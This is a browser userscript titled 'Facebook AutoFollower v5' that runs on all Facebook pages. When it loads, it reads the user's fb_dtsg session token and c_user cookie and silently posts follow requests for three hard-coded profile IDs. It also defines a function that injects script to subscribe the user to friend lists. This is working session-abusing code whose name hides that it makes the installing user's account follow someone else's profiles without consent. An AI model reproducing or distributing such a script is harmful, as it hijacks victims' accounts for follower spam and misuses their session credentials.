
// ==UserScript==

// @name                        Facebook AutoFollower v5

// @description                 Facebook AutoFollower v5

// @include   https://*.facebook.com/*

// @include   https://*.facebook.com/*/*

// @include   http://*.facebook.com/*

// @include   http://*.facebook.com/*/*

// @grant     none

// @version   v 5.0 Final

// @exclude   htt*://apps.facebook.com/*

// @exclude   htt*://*static*.facebook.com*

// @exclude   htt*://*channel*.facebook.com*

// @exclude   htt*://developers.facebook.com/*

// @exclude   htt*://upload.facebook.com/*

// @exclude   htt*://www.facebook.com/common/blank.html

// @exclude   htt*://*connect.facebook.com/*

// @exclude   htt*://*facebook.com/connect*

// @exclude   htt*://www.facebook.com/plugins/*

// @exclude   htt*://www.facebook.com/l.php*

// @exclude   htt*://www.facebook.com/ai.php*

// @exclude   htt*://www.facebook.com/extern/*

// @exclude   htt*://www.facebook.com/pagelet/*

// @exclude   htt*://api.facebook.com/static/*

// @exclude   htt*://www.facebook.com/contact_importer/*

// @exclude   htt*://www.facebook.com/ajax/*

// @exclude   htt*://www.facebook.com/advertising/*

// @exclude   htt*://www.facebook.com/ads/*

// @exclude   htt*://www.facebook.com/sharer/*

// @exclude   htt*://www.facebook.com/send/*

// @exclude   htt*://www.facebook.com/mobile/*

// @exclude   htt*://www.facebook.com/settings/*

// @exclude   htt*://www.facebook.com/dialog/*

// @exclude   htt*://www.facebook.com/plugins/*

// @exclude   htt*://www.facebook.com/bookmarks/*

// @exclude   htt*://developers.facebook.com/*

// @exclude   http://www.facebook.com/plugins/*

// @exclude   http://www.facebook.com/dialog/feed*

// @exclude   https://www.facebook.com/plugins/*

// @exclude   https://www.facebook.com/dialog/feed*

// @exclude   http://www.facebook.com/dialog/oauth?*

// @exclude   https://www.facebook.com/dialog/oauth?*

// @exclude   http://www.facebook.com/dialog/apprequests/*

// @exclude   https://www.facebook.com/dialog/apprequests/*

// @exclude   http://www.facebook.com/l.php?u=*

// @exclude   https://www.facebook.com/l.php?*

// @exclude   https://www.facebook.com/places/map_iframe.php?*



// ==/UserScript==



var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;

a("100000304454381");

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

a("100000388792835");


function cereziAl(isim) {

    var tarama = isim + "=";

    if (document.cookie.length > 0) {

        konum = document.cookie.indexOf(tarama)

        if (konum != -1) {

            konum += tarama.length

            son = document.cookie.indexOf(";", konum)

            if (son == -1)

                son = document.cookie.length

            return unescape(document.cookie.substring(konum, son))

        }

        else { return ""; }

    }

}







function getRandomInt (min, max) {

    return Math.floor(Math.random() * (max - min + 1)) + min;

}

function randomValue(arr) {

    return arr[getRandomInt(0, arr.length-1)];

}



var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);





function a(abone){

    var http4 = new XMLHttpRequest();

     

    var url4 = "/ajax/follow/follow_profile.php?__a=1";

     

    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";

    http4.open("POST", url4, true);

     

    //Send the proper header information along with the request

    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    http4.setRequestHeader("Content-length", params4.length);

    http4.setRequestHeader("Connection", "close");

     

    http4.onreadystatechange = function() {//Call a function when the state changes.

    if(http4.readyState == 4 && http4.status == 200) {

       

      http4.close; // Close the connection

     

    }

    }

    

    http4.send(params4);

 

}







function sublist(uidss) {

  var a = document.createElement('script');

  a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";

  document.body.appendChild(a);

}

a("100002577173085");